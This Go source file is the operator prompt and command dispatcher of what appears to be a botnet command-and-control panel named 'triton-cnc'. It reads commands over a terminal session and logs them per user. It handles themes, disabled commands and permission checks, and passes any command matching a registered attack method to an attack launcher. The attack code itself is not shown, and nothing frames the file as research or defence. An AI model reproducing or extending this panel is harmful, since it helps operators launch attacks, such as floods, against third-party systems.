package views

import (
	"strings"
	"time"
	"triton-cnc/core/attack"
	"triton-cnc/core/models/middleware"
	"triton-cnc/core/models/versions"
	"triton-cnc/core/sessions/commands"
	"triton-cnc/core/sessions/sessions"
	"triton-cnc/core/models/middleware/attack_sort"
	"triton-cnc/core/models/client/terminal"
	"triton-cnc/core/models/json/build"

	"triton-cnc/core/sessions/themes"

	"golang.org/x/term"

	"triton-cnc/core/sessions/handle"
)


func Prompt(session *sessions.Session_Store) {
	

	term_prompt := term.NewTerminal(session.Channel, "")

	var New = HandleFunc.New {
		Username: session.User.Username,
		Channel: session.Channel,
	}

	term_prompt.AutoCompleteCallback = New.CallBackModify

	for {


		var PromptBuild []string
		var lenline int

		if session.CurrentTheme == nil {
			PromptBuild, lenline = terminal.PromptBuild("prompt", session)
			for U := 0; U < lenline-1; U++ {
				session.Channel.Write([]byte(PromptBuild[U]+"\r\n"))
			}
		} else {
			PromptBuild, lenline = terminal.PromptBuild(strings.Split(session.CurrentTheme.Views_Prompt, "/")[1], session)
			for U := 0; U < lenline-1; U++ {
				session.Channel.Write([]byte(PromptBuild[U]+"\r\n"))
			}

		}

		for U := 0; U < lenline-1; U++ {
			session.Channel.Write([]byte(PromptBuild[U]))
		}

		session.Channel.Write([]byte(PromptBuild[lenline-1]))

		Command, error := term_prompt.ReadLine()
		middleware.Log_Timestamp("assets/logs/CallBackLog.log", " "+session.User.Username+" | "+Command+"\r\n")
		if error != nil {
			session.Channel.Write([]byte("\r\nGoodbye...\r\n"))
			time.Sleep(1 * time.Second)
			session.Channel.Close()
			return
		}

		session.Commands = append(session.Commands, Command)

		Execute(Command, session)
		continue
	}
}

func Execute(Command string, Session *sessions.Session_Store) {

	command := strings.Split(Command, " ")

	if command[0] == "credits" && versions.GOOS_Edition.CreditsCommand {
		Session.Channel.Write([]byte(versions.GOOS_Edition.Credits))
		return
	}

	for _, I := range build.Config.Disabled_commands {
		if strings.ToLower(command[0]) == strings.ToLower(I) {
			var CommandCSM = map[string]string {
				"command":command[0],
			}
			terminal.Banner("command-404", Session.User, Session.Channel, true, false, CommandCSM)
			return
		}
	}

	if strings.ToLower(command[0]) == "normal" && Session.CurrentTheme != nil {
		Session.CurrentTheme = nil
		error,_ := terminal.Banner("home-splash", Session.User, Session.Channel, true, false, nil)
		if error != nil {
			return
		}
		return
	}


	exists := themes.CheckTheme(strings.ToLower(command[0]))
	if exists {
		changed := themes.ChangeTheme(command[0], Session)
		if changed {
			Session.Channel.Write([]byte("\x1b[38;5;2mTheme has been changed correctly\r\n"))
			if Session.CurrentTheme.ClearWhenChange {
				Home_Splash(Session.Channel, Session.Conn, Session.User, Session)
			}
			return
		}
		Session.Channel.Write([]byte("\x1b[38;5;1mTheme has failed to be changed correctly\r\n"))
		Session.CurrentTheme = nil
		return
	}

	Commands := mix_commands.Mixer(strings.ToLower(command[0]))
	if Commands == nil {

		Method := attacksort.Get(strings.ToLower(command[0]))
		if Method != nil {
			attacks.New_Attack(command, Session)
			return
		}

		var CommandCSM = map[string]string {
			"command":command[0],
		}
		terminal.Banner("command-404", Session.User, Session.Channel, true, false, CommandCSM)
		return
	}

	if Session.CurrentTheme != nil {
		for _, Word := range Session.CurrentTheme.BlockedCommands {
			if Word == command[0] {
				var CommandCSM = map[string]string {
					"command":command[0],
				}
				terminal.Banner("command-404", Session.User, Session.Channel, true, false, CommandCSM)
				return
			}
		}
	}

	Raw := mix_commands.CheckPermissions(Commands, Session.User)
	if !Raw {
		var CommandCSM = map[string]string {
			"command":command[0],
		}
		terminal.Banner("command-401", Session.User, Session.Channel, true, false, CommandCSM)
		return
	}

	error := Commands.Execute(Session, command)
	if error != nil {
		if Session.User.Administrator {
			Session.Channel.Write([]byte("		ERROR: Command Handler error > "+error.Error()))	
			return
		}

		var CommandCSM = map[string]string {
			"command":command[0],
		}
		terminal.Banner("command-400", Session.User, Session.Channel, true, false, CommandCSM)
	}
}


